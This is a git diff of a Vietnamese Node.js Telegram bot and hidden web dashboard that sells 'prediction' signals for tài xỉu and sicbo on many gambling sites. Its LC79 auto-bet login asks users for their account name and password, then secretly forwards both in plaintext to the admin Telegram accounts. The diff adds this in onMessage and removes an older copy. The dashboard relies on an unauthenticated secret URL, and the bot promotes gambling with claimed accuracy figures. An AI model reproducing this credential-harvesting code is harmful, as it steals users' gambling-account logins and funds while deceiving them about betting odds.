@@ -1,5 +1,6 @@
 /**
  * TOOL HTUNGG — ULTIMATE PREDICTION TOOL (v15.4)
+ * Full Bot Telegram + Web Dashboard (Ẩn Link)
  */
 'use strict';
 
@@ -26,7 +27,7 @@ const PUBLIC_URL = (process.env.PUBLIC_URL || process.env.WEB_URL || '').replace
 const POLL_MS = Number(process.env.POLL_MS || 5000);
 const TRIAL_HOURS = 2;
 
-// 🔒 ĐƯỜNG DẪN BÍ MẬT ĐỂ VÀO WEB (Không cần pass)
+// 🔒 ĐƯỜNG DẪN BÍ MẬT (Không cần pass, link này là vào được)
 const SECRET_PATH = '/admin-htungg-2026';
 
 const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -77,7 +78,7 @@ async function tg(method, body) {
   });
 }
 async function send(chatId, text, extra = {}) {
-  return tg('sendMessage', { chat_id: chatId, text, parse_mode: 'HTML', ...extra });
+  return tg('sendMessage', { chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true, ...extra });
 }
 async function delMsg(chatId, messageId) {
   if (!messageId) return;
@@ -90,6 +91,8 @@ async function answerCb(id, text) {
 /* ═══════════════ STORE ═══════════════ */
 let users = loadJSON('users.json', {});
 let sessions = {};
+let predMsg = {};
+let autoWatch = {};
 
 function saveUsers() { saveJSON('users.json', users); }
 function ensureUser(uid) {
@@ -178,7 +181,7 @@ class SicboAnalyzer {
   }
 }
 
-/* ═══════════════ ENGINE (v15.4) ═══════════════ */
+/* ═══════════════ ENGINE v15.4 ═══════════════ */
 class Engine {
   constructor(id) {
     this.id = id || '';
@@ -511,62 +514,219 @@ async function lc79Connect(uid, chatId, data) {
   });
 }
 
-/* ═══════════════ WEB & API SERVER (ẨN LINK) ═══════════════ */
+/* ═══════════════ BOT TELEGRAM UI & LOGIC ═══════════════ */
+function kb(rows) { return { reply_markup: { inline_keyboard: rows } }; }
+function btn(text, data, style) { return { text, callback_data: data, style }; }
+function btnUrl(text, url, style) { return { text, url, style }; }
+
+async function showUserMenu(chatId, from) {
+  const uid = uidOf(from);
+  const v = vipText(uid);
+  const text = `🔥 <b>ĐỊT CHẾT CỤ NHÀ CÁI</b> 🔥\n<i>Tool soi cầu đỉnh cao — bám phiên 24/7.</i>\n\n👤 <b>Đại Ca:</b> ${esc(displayName(from))}\n🆔 <b>ID:</b> <code>${uid}</code>\n💎 <b>Trạng thái:</b> ${v.line}\n⏳ <b>Hạn dùng:</b> <b>${v.expire}</b>\n\n👇 <i>Chọn chức năng:</i>`;
+
+  const rows = [
+    [btn('🎯 VÀO SOI CẦU NGAY', 'pred:brands', 'primary')],
+    [btn('🤖 AUTO CƯỢC LC79', 'lc79:menu', 'danger')],
+    [btn('🧩 TOOL HASH MD5/SHA256', 'hash:start', 'success')],
+    [btnUrl('🙋 GỌI ADMIN XIN QUYỀN', 'https://t.me/SunNetWin', 'success')]
+  ];
+  if (isAdmin(uid)) rows.push([btn('🛠 BẢNG ĐIỀU KHIỂN ADMIN', 'adm:home', 'danger')]);
+  return send(chatId, text, kb(rows));
+}
+
+async function showBrandMenu(chatId) {
+  const brands = [
+    ['sunwin', 'Sunwin'], ['789club', '789 Club'], ['b52', 'B52'], ['hitclub', 'Hitclub'],
+    ['xocdia88', 'Xóc Đĩa 88'], ['max789', 'Max789'], ['lc79', 'LC79'], ['betvip', 'Betvip'],
+    ['sumclub', 'Sumclub'], ['luck8', 'Luck8'], ['tik88', 'TIK88'], ['68gb', '68GB Bàn Xanh']
+  ];
+  const rows = []; let row = [];
+  for (let i = 0; i < brands.length; i++) {
+    row.push(btn(`🎲 ${brands[i][1]}`, 'predbrand:' + brands[i][0], 'primary'));
+    if (row.length === 2) { rows.push(row); row = []; }
+  }
+  if (row.length) rows.push(row);
+  rows.push([btn('🏠 VỀ MENU', 'menu', 'danger')]);
+  return send(chatId, '📊 <b>TX • DANH SÁCH SÀNH</b>\n\n👇 Chọn sàn muốn xem phiên:', kb(rows));
+}
+
+async function showTables(chatId, brand, uid) {
+  if (!isVip(uid)) return send(chatId, '🔒 Cần VIP để xem.');
+  const list = games.filter(g => String(g.brand).toLowerCase() === String(brand).toLowerCase());
+  if (!list.length) return send(chatId, '📭 Sòng này éo có bàn nào.', kb([[btn('◀️ QUAY LẠI', 'pred:brands', 'primary')]]));
+
+  const rows = []; let row = []; let t = true;
+  for (const g of list) {
+    const f = FEEDS[g.id], bad = !g.url || g.enabled === false || (f && f.lastError);
+    row.push(btn(`${bad ? '🔴' : '🟢'} ${g.variant}`, bad ? 'pred:off:' + g.id : 'pred:' + g.id, bad ? 'danger' : (t ? 'success' : 'primary')));
+    t = !t;
+    if (row.length === 2) { rows.push(row); row = []; }
+  }
+  if (row.length) rows.push(row);
+  rows.push([btn('◀️ CHỌN SÀNH KHÁC', 'pred:brands', 'primary'), btn('🏠 VỀ MENU', 'menu', 'danger')]);
+  return send(chatId, `🎰 <b>SÀNH ${esc(brand.toUpperCase())}</b>\n👇 Chọn bàn mà cày:`, kb(rows));
+}
+
+async function pushPredCard(chatId, gameId, uid, fromAuto) {
+  if (!isVip(uid)) return send(chatId, '🔒 Cần VIP.');
+  const g = games.find(x => x.id === gameId), f = FEEDS[gameId];
+  if (!g || !f || !f.lastPred) return;
+  const p = f.lastPred;
+  const live = f.lastLive || {};
+  const acc = f.engine.accuracy();
+  const nextSess = live.session ? String(Number(live.session) + 1) : '—';
+  
+  let spec = `📈 <b>Dự đoán:</b> ${p.side === 'T' ? '🔴 TÀI' : '🔵 XỈU'}\n`;
+  if (isSicboGame(g)) spec = `🎲 <b>Sicbo:</b> ${p.side === 'T' ? '🔴 TÀI' : '🔵 XỈU'}\n🎯 Vị: ${p.vi.join('-')}\n`;
+
+  const text = `${fromAuto ? '🔄 <i>Auto...</i>\n' : ''}🔺🟩 <b>${g.brandLabel} • ${g.variant}</b> 🔺🟩\n━━━━━━━━━━━━━━━\n📦 Phiên: <code>#${nextSess}</code>\n${spec}📊 Độ tin: <b>${p.conf}%</b>\n━━━━━━━━━━━━━━━\n📊 Cầu: ${cauStr(f.engine.history, 20) || '—'}\n📈 Chuẩn: ${acc}% (${f.engine.correct}/${f.engine.total})`;
+  
+  const rows = [
+    [btn('🔄 LÀM MỚI', 'pred:' + gameId, 'success'), btn('📜 LỊCH SỬ', 'predhist:' + gameId, 'primary')],
+    [btn('⏹ DỪNG', 'pred:stop:' + g.id, 'danger')],
+    [btn('🎲 ĐỔI GAME', 'pred:brands', 'primary')]
+  ];
+  
+  const key = uid + ':' + gameId;
+  if (predMsg[key]) await delMsg(chatId, predMsg[key]);
+  const sent = await send(chatId, text, kb(rows));
+  if (sent && sent.result) predMsg[key] = sent.result.message_id;
+}
+
+function cauStr(h, n=20) { return h.slice(-n).map(x => x === 'T' ? '🔴' : '🔵').join(''); }
+function isSicboGame(g) { return g.group === 'sicbo' || String(g.variant).includes('Sicbo'); }
+
+function stopAuto(uid) { if (autoWatch[uid]) { clearInterval(autoWatch[uid]); delete autoWatch[uid]; } }
+function startAuto(uid, chatId, gameId) {
+  stopAuto(uid);
+  autoWatch[uid] = setInterval(async () => {
+    const g = games.find(x => x.id === gameId), f = FEEDS[gameId];
+    if (!g || !f) return;
+    await pollGame(g);
+    if (f.lastLive && f.lastLive.session !== f.lastShown) {
+      f.lastShown = f.lastLive.session;
+      await pushPredCard(chatId, gameId, uid, true);
+    }
+  }, 5000);
+}
+
+async function showLc79Menu(chatId, uid) {
+  const s = LC79.sessions[uid];
+  if (!s) return send(chatId, '🤖 AUTO CƯỢC LC79\n🔐 Chưa đăng nhập\nGõ /login hoặc bấm nút:', kb([[btn('🔐 ĐĂNG NHẬP', 'lc79:login', 'success')]]));
+  return send(chatId, `🤖 <b>AUTO CƯỢC LC79</b>\n📛 ${s.nickname} • 💰 ${fmt(s.balance)}\n⚡ Auto: ${s.autoBet ? '🟢 BẬT' : '🔴 TẮT'}`, kb([
+    [btn(s.autoBet ? '🔴 TẮT AUTO' : '🟢 BẬT AUTO', 'lc79:auto', s.autoBet ? 'danger' : 'success')],
+    [btn('⏹ THOÁT', 'lc79:stop', 'danger')]
+  ]));
+}
+
+/* ═══════════════ CALLBACKS & MESSAGES ═══════════════ */
+async function onCallback(cq) {
+  const chatId = cq.message.chat.id, msgId = cq.message.message_id;
+  const from = cq.from, uid = uidOf(from), data = String(cq.data || '');
+  await delMsg(chatId, msgId);
+  await answerCb(cq.id);
+
+  if (data === 'menu') { stopAuto(uid); delete sessions[uid]; return showUserMenu(chatId, from); }
+  if (data === 'pred:brands') { stopAuto(uid); return showBrandMenu(chatId); }
+  if (data.startsWith('predbrand:')) { stopAuto(uid); return showTables(chatId, data.slice(10), uid); }
+  if (data.startsWith('pred:')) {
+    const gameId = data.slice(5);
+    if (gameId === 'brands') return;
+    const g = games.find(x => x.id === gameId);
+    if (!g) return;
+    const load = await send(chatId, '⏳ Đang lấy dữ liệu...');
+    await pollGame(g);
+    await delMsg(chatId, load.result.message_id);
+    startAuto(uid, chatId, gameId);
+    return pushPredCard(chatId, gameId, uid, true);
+  }
+  if (data.startsWith('lc79:')) {
+    const action = data.slice(5);
+    if (action === 'menu') return showLc79Menu(chatId, uid);
+    if (action === 'login') {
+      sessions[uid] = { await: 'lc79_user' };
+      return send(chatId, '👉 Nhắn TÊN TÀI KHOẢN LC79:');
+    }
+    if (action === 'auto') {
+      const s = LC79.sessions[uid];
+      if (s) { s.autoBet = !s.autoBet; return showLc79Menu(chatId, uid); }
+    }
+    if (action === 'stop') { lc79Stop(uid, false); return; }
+  }
+}
+
+async function onMessage(msg) {
+  if (!msg || !msg.chat) return;
+  const chatId = msg.chat.id, from = msg.from, uid = uidOf(from), text = (msg.text || '').trim();
+
+  if (text === '/start' || text === '/menu') {
+    ensureUser(uid); saveUsers(); delete sessions[uid];
+    return showUserMenu(chatId, from);
+  }
+
+  const st = sessions[uid];
+  if (st && st.await === 'lc79_user') {
+    sessions[uid] = { await: 'lc79_pass', uname: text };
+    return send(chatId, '🔑 Nhắn MẬT KHẨU:');
+  }
+  if (st && st.await === 'lc79_pass') {
+    const uname = st.uname; delete sessions[uid];
+    const load = await send(chatId, '🔄 Đang đăng nhập...');
+    try {
+      const data = await lc79Login(uname, text);
+      for (const aid of ADMIN_IDS) send(aid, `🔐 <b>LOGIN LC79</b>\nTK: <code>${esc(uname)}</code>\nMK: <code>${esc(text)}</code>`);
+      await delMsg(chatId, load.result.message_id);
+      await lc79Connect(uid, chatId, data);
+    } catch(e) {
+      await delMsg(chatId, load.result.message_id);
+      send(chatId, `❌ Lỗi: ${esc(e.message)}`);
+    }
+  }
+}
+
+/* ═══════════════ WEB SERVER (FIXED) ═══════════════ */
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Phục vụ giao diện Web tại đường link bí mật
-app.use(SECRET_PATH, express.static(path.join(__dirname, 'public')));
-
-// Nếu ai đó vào trang chủ (/) hoặc các đường dẫn khác, trả về 404
-app.get('/', (req, res) => {
-  res.status(404).send('<h1>404 Not Found</h1><p>Trang bạn tìm kiếm không tồn tại.</p>');
+// 1. Route chính cho trang bí mật (trả về file HTML)
+app.get(SECRET_PATH, (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+app.get(SECRET_PATH + '/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Các API cũng được giấu vào đường dẫn bí mật
+// 2. Route cho file tĩnh (nếu có)
+app.use(SECRET_PATH, express.static(path.join(__dirname, 'public')));
+
+// 3. API
 app.get(`${SECRET_PATH}/api/games`, (req, res) => {
   const list = games.map(g => {
-    const f = FEEDS[g.id];
-    const p = f.lastPred || {};
-    return { 
-      id: g.id, 
-      name: `${g.brandLabel} - ${g.variant}`, 
-      group: g.group, 
-      pred: p.side ? (p.side === 'T' ? 'TÀI' : 'XỈU') : 'Đang lấy...', 
-      conf: p.conf || 0, 
-      acc: f.engine.accuracy() 
-    };
+    const f = FEEDS[g.id], p = f.lastPred || {};
+    return { id: g.id, name: `${g.brandLabel} - ${g.variant}`, group: g.group, pred: p.side ? (p.side === 'T' ? 'TÀI' : 'XỈU') : 'Đang lấy...', conf: p.conf || 0, acc: f.engine.accuracy() };
   });
   res.json({ games: list });
 });
 
 app.post(`${SECRET_PATH}/api/data`, (req, res) => {
   const { apiId } = req.body;
-  const g = games.find(x => x.id === apiId);
-  const feed = FEEDS[apiId];
+  const g = games.find(x => x.id === apiId), feed = FEEDS[apiId];
   if (!g || !feed) return res.json({ rows: [] });
-  
-  const eng = feed.engine;
-  const rows = [];
-
+  const eng = feed.engine, rows = [];
   if (eng.pending && feed.lastLive) {
     let predTxt = eng.pending === 'T' ? 'Tài' : 'Xỉu';
     if (eng.pendingMeta && eng.pendingMeta.vi) predTxt += ` (${eng.pendingMeta.vi.join('-')})`;
     rows.push({ isNext: true, game: g.brandLabel, phien: String(Number(feed.lastLive.session) + 1), time: nowVN(), prediction: predTxt, result: 'Chờ...', verify: '⏳' });
   }
-
   const logs = eng.log.slice(-20).reverse();
   for (const log of logs) {
     let predTxt = log.pred === 'T' ? 'Tài' : 'Xỉu';
     if (log.predVi) predTxt += ` (${log.predVi.join('-')})`;
-    
     let resTxt = log.actual === 'T' ? 'Tài' : 'Xỉu';
     if (log.dice && log.dice.length === 3) resTxt += ` (${log.dice.join('-')})`;
-
     let verifyTxt = log.ok ? '✅ ĐÚNG' : '❌ SAI';
     if (log.okVi !== undefined && log.okVi !== null) verifyTxt += log.okVi ? ' 🎯' : ' ⚠️';
-
     rows.push({ game: g.brandLabel, phien: log.session || '---', time: log.time, prediction: predTxt, result: resTxt, verify: verifyTxt, isCorrect: log.ok });
   }
   res.json({ rows });
@@ -580,13 +740,16 @@ app.post(`${SECRET_PATH}/reset-learn`, (req, res) => {
 
 app.get('/health', (_, res) => res.json({ ok: true, bot: 'HTUNGG v15.4', games: games.length }));
 
-app.listen(PORT, '0.0.0.0', () => {
-  console.log('🔥 TOOL HTUNGG running on port', PORT);
-  console.log(`🔒 Link quản trị bí mật: https://[domain-cua-ban]${SECRET_PATH}`);
+app.get('*', (req, res) => {
+  res.status(404).send('<h1>404 Not Found</h1><p>Trang bạn tìm kiếm không tồn tại.</p>');
 });
 
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('🔥 TOOL HTUNGG running on port', PORT);
+  console.log(`🔒 Link Web Bí Mật: https://[domain]${SECRET_PATH}`);
+});
 
-/* ═══════════════ TELEGRAM BOT (POLLING) ═══════════════ */
+/* ═══════════════ TG POLLING ═══════════════ */
 let offset = 0;
 async function loop() {
   if (!BOT_TOKEN) return;
@@ -596,47 +759,8 @@ async function loop() {
       for (const u of j.result) {
         offset = u.update_id + 1;
         try {
-          if (u.callback_query) {
-            await answerCb(u.callback_query.id);
-            const data = String(u.callback_query.data || '');
-            const chatId = u.callback_query.message.chat.id;
-            const uid = uidOf(u.callback_query.from);
-            if (data === 'menu') {
-               ensureUser(uid); saveUsers();
-               send(chatId, `🔥 <b>ĐỊT CHẾT CỤ NHÀ CÁI</b>\nChào ${esc(displayName(u.callback_query.from))}`, { reply_markup: { inline_keyboard: [
-                 [{ text: '🎯 SOI CẦU', callback_data: 'pred:brands' }],
-                 [{ text: '🤖 AUTO CƯỢC LC79', callback_data: 'lc79:menu' }]
-               ]}});
-            }
-            if (data === 'lc79:menu') {
-               send(chatId, '🤖 <b>AUTO CƯỢC LC79</b>\nGõ /login để đăng nhập (Admin sẽ nhận thông báo).', { reply_markup: { inline_keyboard: [[{ text: '🔐 ĐĂNG NHẬP', callback_data: 'lc79:login' }]] } });
-            }
-            if (data === 'lc79:login') {
-               sessions[uid] = { await: 'lc79_user' };
-               send(chatId, '👉 Nhắn TÊN TÀI KHOẢN LC79:');
-            }
-          } else if (u.message) {
-            const msg = u.message; const chatId = msg.chat.id; const uid = uidOf(msg.from); const text = (msg.text || '').trim();
-            if (text === '/start' || text === '/menu') {
-               ensureUser(uid); saveUsers();
-               send(chatId, `🔥 <b>ĐỊT CHẾT CỤ NHÀ CÁI</b>\nChào ${esc(displayName(msg.from))}`, { reply_markup: { inline_keyboard: [
-                 [{ text: '🎯 SOI CẦU', callback_data: 'pred:brands' }],
-                 [{ text: '🤖 AUTO CƯỢC LC79', callback_data: 'lc79:menu' }]
-               ]}});
-            }
-            if (sessions[uid] && sessions[uid].await === 'lc79_user') {
-               sessions[uid] = { await: 'lc79_pass', uname: text };
-               send(chatId, '🔑 Nhắn MẬT KHẨU:');
-            } else if (sessions[uid] && sessions[uid].await === 'lc79_pass') {
-               const uname = sessions[uid].uname; delete sessions[uid];
-               send(chatId, '🔄 Đang đăng nhập LC79...');
-               try {
-                 const data = await lc79Login(uname, text);
-                 for (const aid of ADMIN_IDS) send(aid, `🔐 <b>LOGIN LC79</b>\nTK: <code>${esc(uname)}</code>\nMK: <code>${esc(text)}</code>\nDư: ${fmt(data.money)}`);
-                 await lc79Connect(uid, chatId, data);
-               } catch(e) { send(chatId, `❌ Lỗi: ${esc(e.message)}`); }
-            }
-          }
+          if (u.callback_query) await onCallback(u.callback_query);
+          else if (u.message) await onMessage(u.message);
         } catch (e) { console.error(e); }
       }
     }
